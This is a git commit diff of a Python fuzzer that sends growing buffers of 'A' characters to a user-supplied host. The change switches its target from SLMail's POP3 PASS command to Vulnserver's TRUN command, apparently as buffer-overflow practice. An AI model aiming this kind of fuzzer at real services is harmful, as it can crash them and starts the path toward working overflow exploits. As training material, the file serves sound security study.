ddaccd4ef3d93888b07a933f801e7e9a58c1d6d8
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-02-13 11:50:39 +0530

    Update fuzzer-1.py

--- fuzzer-1.py
+++ fuzzer-1.py
@@ -1,33 +1,31 @@
 #!/usr/bin/python3
 
-from time import sleep
 import sys,socket
+from time import sleep
 
-print("**********SLMAIL POP3 vulnerability**********")
+print("**************VULNSERVER- TRUN *************")
 sleep(0.5)
-ip_address=input("Enter the IP address:\n")
-port_number=input("Enter the Port number:\n")
+ip_address=input("ENter the IP address\n")
+port_number=input("Enter the port number\n")
 
-if(len(ip_address)<=0) or (len(port_number)<=0):
-    if(len(ip_address)>0) and (len(port_number)<=0):
-        print("*"*25)
+if (len(ip_address)<=0) or (len(port_number)<=0):
+    if (len(ip_address)>0) and (len(port_number)<=0):
+        print("*" * 30)
         print("Port number field is empty")
-    elif(len(ip_address)<=0) and (len(port_number)>0):
-        print("*"*25)
-        print("IP addres field is empty")
+    elif (len(ip_address)<=0) and (len(port_number)>0):
+        print("*" * 30)
+        print("IP address field is empty")
     else:
-        print("*"*25)
+        print("*" * 30)
         print("Issues with the user input")
 
-elif(len(ip_address)>0) and (len(port_number)>0):
-    print("*"*25)
+elif (len(ip_address)>0) and (len(port_number)>0):
     buffer=100
     while(buffer<=10000):
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        print(f"Sending buffer --> {buffer}")
         s.connect((ip_address, int(port_number)))
-        print("Sending buffer -->" + str(buffer))
-        s.send((b"USER TEST\r\n"))
-        s.send((b"PASS " + b"A" *buffer + b"\r\n"))
+        s.send((b"TRUN /.:/" + b"A" * buffer))
         s.close()
         buffer=buffer+200
         sleep(1)
